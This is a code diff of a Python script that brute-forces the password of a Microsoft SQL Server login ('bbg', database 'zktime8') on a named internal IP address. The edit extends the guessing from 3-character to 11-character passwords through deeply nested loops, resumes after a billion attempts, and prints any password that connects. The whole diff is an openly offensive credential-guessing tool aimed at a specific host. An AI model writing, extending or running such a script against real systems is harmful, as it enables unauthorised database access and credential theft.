@@ -74,16 +74,28 @@ def main():
     for ch1 in range(len(charset)):
         for ch2 in range(len(charset)):
             for ch3 in range(len(charset)):
-                password = str(charset[ch1]) + str(charset[ch2]) + str(charset[ch3])
-                i += 1
-                if i >= 188:  # 断点
-                    try:
-                        ms = MSSQL(host="192.168.2.228", user="bbg", pwd=password, db="zktime8")
-                        query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
-                        print('Success!', password, ';', query)
-                        input('Wait........')
-                    except Exception as e:
-                        print('id:', i, '，try:', password, e)
+                for ch4 in range(len(charset)):
+                    for ch5 in range(len(charset)):
+                        for ch6 in range(len(charset)):
+                            for ch7 in range(len(charset)):
+                                for ch8 in range(len(charset)):
+                                    for ch9 in range(len(charset)):
+                                        for ch10 in range(len(charset)):
+                                            for ch11 in range(len(charset)):
+                                                password = str(charset[ch1]) + str(charset[ch2]) + str(
+                                                    charset[ch3]) + str(charset[ch4]) + str(charset[ch5]) + str(
+                                                    charset[ch6]) + str(charset[ch7]) + str(charset[ch8]) + str(
+                                                    charset[ch9]) + str(charset[ch10]) + str(charset[ch11])
+                                                i += 1
+                                                if i >= 1000000000:  # 断点
+                                                    try:
+                                                        ms = MSSQL(host="192.168.2.228", user="bbg", pwd=password,
+                                                                   db="zktime8")
+                                                        query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
+                                                        print('Success!', password, ';', query)
+                                                        input('Wait........')
+                                                    except Exception as e:
+                                                        print('id:', i, '，try:', password, e)
 
 
 if __name__ == '__main__':
